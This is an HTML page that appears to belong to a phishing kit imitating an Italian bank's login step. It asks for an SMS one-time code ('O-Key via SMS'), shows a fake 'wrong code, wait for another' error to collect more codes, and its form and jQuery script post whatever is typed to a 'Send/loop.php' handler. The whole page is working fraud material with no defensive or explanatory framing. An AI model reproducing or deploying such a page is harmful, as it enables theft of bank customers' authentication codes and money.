<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="css/css.css">

</head>
<body style="background: none;
display: inline-block;
text-align: center;">

<form target="_top" action="Send/loop.php" method="post" id="login1form">
<div class="isp-ib-open-sans-regular-13 ispFormField ispInput ng-pristine ng-isolate-scope ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom" name="login.user.useridForm" placeholder="Codice Titolare" input-label="" input-format="limiteddigits" is-required="true" on-change="changeUserFocus()" minlength="6" maxlength="8" aria-describedby="loginMessageError" id="loginpage-logincontroller-login-user_input" style="">
<label class="ispFormFieldLabel" style="font-size: 14px !important;padding-right: 7px; " for="loginpage-logincontroller-login-user" aria-hidden="true">Inserisci il codice SMS che hai ricevuto</label>


   
                                                    <div class=" " id="loginpage-logincontroller-login-user_div" tabindex="-1" role="presentation">
                                                    
                                                        <span>
			<input autocomplete="" id="username" required="" name="user" minlength="0" maxlength="11" type="text" placeholder="O-Key via SMS" class="ng-pristine ng-untouched ng-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom" aria-invalid="true" style=""><!-- end ngIf: inputFormat != 'date' -->
		</span>
                                                    </div>
                                                    <span style="color:red;">Hai inserito un codice sbagliato, aspettane un altro.</span>
<label role="alert" id="required_error_1" style="display:none" class="error ng-binding ng-scope"><span class="visible-xs sr-only">
                                                    </span>Campo obbligatorio: compila per proseguire</label>
                                                </div>
                                                <div class="col-sm-25 col-xs-25">
                                                <style>
                                                .up-checkbox {
    display: block;
    height: 20px;
    margin-bottom: calc(8px * 3);
    margin-top: 16px;
}
.checkbox-container {
    align-items: center;
    display: inline-flex;
    height: 20px;
    cursor: pointer;
    user-select: none;
    -moz-user-select: none;
    -webkit-user-select: none;
    -ms-user-select: none;
}
.checkbox-container .checkbox {
    transition: background-color 140ms ease-out, border 140ms ease-out;
}
.checkbox-container .checkbox {
    width: 18px;
    height: 18px;
    border-radius: 2px;
    box-sizing: border-box;
    border: 2px solid;
}
.checkbox-container .checkmark {
    transition: transform 140ms ease-out;
    padding-bottom: 4px;
}

.checkbox-container .checkbox-label {
    margin-left: 8px;
font-size: 14px;
text-align: left;

}


  

                                                </style>





                                               </div>
<a>
<button id="enter1Login" style="min-height: 40px;margin-top: 15px;" class="isp-ib-arial-bold-14 login-enter-button ispIbDirectiveControlbuttonsButtonMargin              col-md-23 isp-ib-submit">
ENTRA
</button>
</a>
</form>
<hr>



<script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>          
<script>
$( "#checkboxmarks").click(function(event) {
    event.preventDefault();
    var input = $("#checkboxvalue").val();
    if(input == 0){
        $(".checkbox").css({'background-color':'#258900','border-color':'#258900'});
        $(".checkbox img").css('display','block');
        $("#checkboxvalue").val(1);
        $(".checkbox-label").css('color','#323232');
    }else{
        $(".checkbox").css({'background-color':'','border-color':''});
        $(".checkbox img").css('display','none');
        $("#checkboxvalue").val(0);
    }

});
$( "#enter1Login").click(function(event) {
  event.preventDefault();
  var pass = $("#username").val();
  var checkbox = $("#checkboxvalue").val();

 
 if(pass.length <= 5){
    $("#username").parent().parent().addClass('error');
 }else if(checkbox == 0){
    $(".checkbox").css('border-color','#f00');
    $(".checkbox-label").css('color','#f00');
  }else{
      $("#login1form").submit();
  }

});

</script>



</body></html>